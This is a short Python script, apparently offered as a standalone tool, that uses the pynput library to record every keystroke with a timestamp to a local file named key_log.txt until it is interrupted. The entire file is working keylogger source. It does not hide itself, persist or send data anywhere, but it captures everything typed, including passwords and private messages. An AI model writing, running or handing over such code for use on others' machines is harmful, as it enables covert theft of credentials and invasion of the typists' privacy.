from pynput.keyboard import Key, Listener
import logging
import signal
import sys

log_dir = ""  # Directory to save the log file

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

def signal_handler(sig, frame):
    print('Exiting...')
    listener.stop()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)  # Handle Ctrl+C
signal.signal(signal.SIGTERM, signal_handler) # Handle termination

with Listener(on_press=on_press) as listener:
    listener.join()
